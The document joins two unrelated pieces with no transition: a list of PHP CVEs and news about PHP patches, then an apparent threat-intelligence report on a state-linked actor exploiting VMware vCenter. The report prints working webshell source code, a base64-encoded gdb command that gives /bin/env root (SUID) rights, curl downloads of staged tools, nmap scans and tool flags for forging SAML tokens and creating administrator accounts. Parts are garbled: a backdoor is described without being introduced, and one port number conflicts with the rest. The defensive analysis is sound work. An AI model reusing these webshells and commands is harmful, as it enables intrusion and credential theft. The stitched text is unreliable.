CVE-2026-129481 (CVSS 9.2): A use-after-free vulnerability triggered by an interrupted session shutdown, potentially allowing memory corruption and remote code execution

CVE-2026-129474 (CVSS 9.2): A use-after-free flaw in magic method backtraces that could allow attackers to execute arbitrary code

CVE-2026-129182 (CVSS 9.2): A use-after-free vulnerability involving the repopulation of the last fatal error backtrace after shutdown, potentially leading to remote code execution

CVE-2026-129496 (CVSS 9.2): A use-after-free vulnerability in the time zone cache that could potentially lead to remote code execution

CVE-2026-129501 (CVSS 6.3): A double-free vulnerability during DOM XML serialization that can cause memory corruption and denial of service

CVE-2026-129538 (CVSS 6.9): An out-of-bounds read and write vulnerability in PHP-CGI when correcting the PATH_INFO environment variable, potentially resulting in memory corruption

CVE-2026-129291 (CVSS 8.8): A use-after-free vulnerability in PHP-FPM's epoll event handling that could allow local privilege escalation

CVE-2026-129289 (CVSS 9.2): A request-smuggling vulnerability caused by unread HTTP request bodies, potentially allowing attackers to manipulate how requests are processed

CVE-2026-129292 (CVSS 5.3): A cross-site scripting (XSS) vulnerability in the PHP-FPM status endpoint, caused by insufficient escaping of user and script fields

CVE-2026-128090 (CVSS 7.7): An OpenSSL signature verification bypass caused by an algorithm downgrade, potentially allowing malicious PHAR archives to pass signature checks

CVE-2026-15353 (CVSS 6.3): An information disclosure vulnerability involving malformed array dimensions during SOAP processing

CVE-2026-129506 (CVSS 6.3): A use-after-free vulnerability when processing DTD entity references, potentially resulting in memory corruption

CVE-2026-128064 (CVSS 8.2): A vulnerability involving mixed-case HTTPS and FTPS URLs that could cause sensitive information to be transmitted in plaintext rather than encrypted

CVE-2026-127960 (CVSS 8.7): A denial-of-service vulnerability involving folded HTTP response headers, potentially allowing attackers to disrupt service availability

CVE-2026-129438 (CVSS 6.3): An incorrect RFC 3986 URI serialization vulnerability affecting oversized input, potentially resulting in invalid URI output

CVE-2026-48841 (CVSS not published): a vulnerability in the bundled uriparser library (a PHP third-party dependency) addressed by upgrading the dependency to version 1.0.3

PHP Ecosystem Projects Prepare Security Updates

The patches, published on November 19, are part of PHP’s regular four-week release cycle and come alongside the release of several versions of PHP (8.2.36, 8.3.37, 8.4.28, 8.5.13 and 8.6).

The PHP team warned users about the vulnerabilities and their forthcoming fixes on November 18.

Users are strongly encouraged to prepare to upgrade promptly once the releases become available. Technical details and fixed version numbers will be published alongside the releases.

Maintainers of open-source projects that rely on PHP have already been working to incorporate the security fixes into their software and distributions, helping ensure that patches reach downstream users as quickly as possible.

For instance, Kevin Dunglas, creator of FrankenPHP, a modern PHP application server built around the Caddy web server, said on X that the project is working with The PHP Foundation and Docker to provide updated builds as soon as the patched PHP version becomes available. These will include static binaries, RPM and DEB packages, Homebrew packages and Docker images based on Debian and Alpine Linux.

Meanwhile, Laravel, a popular open-source PHP framework used by developers to build websites, web applications and APIs, said on X it was already working on a remediation plan to protect applications running across its hosting and deployment services.

Title: ARMORY CASTLE Exploits vSphere
Context: ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct...
Full Text:
Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05. We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (vmdird) RPC interface vmdirdbcp. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui. The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp, tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123. if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...), the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output (getInputStream()) and standard error (getErrorStream()), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code (\nEXIT:). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp, tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/, and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp, and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env, any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local. BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir, forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/. BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear. The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local. Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py, alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE-2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch. The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool. This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials.
